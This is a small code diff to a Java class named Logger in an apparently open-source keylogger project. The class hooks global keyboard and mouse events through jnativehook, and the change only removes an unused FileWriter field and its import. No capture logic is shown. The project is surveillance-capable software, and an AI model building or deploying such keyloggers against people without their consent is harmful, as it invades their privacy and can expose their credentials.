@@ -1,7 +1,6 @@
 package com.github.keylogger;
 
 import java.io.File;
-import java.io.FileWriter;
 import java.io.IOException;
 import java.nio.file.Files;
 import java.nio.file.StandardOpenOption;
@@ -19,11 +18,9 @@ import org.jnativehook.mouse.NativeMouseWheelListener;
 public class Logger implements NativeKeyListener, NativeMouseWheelListener, NativeMouseListener, NativeMouseMotionListener {
 
     private final File file;
-    private final FileWriter w;
 
     public Logger(File file) throws IOException, NativeHookException {
         this.file = file;
-        this.w = new FileWriter(this.file);
 
     }
 
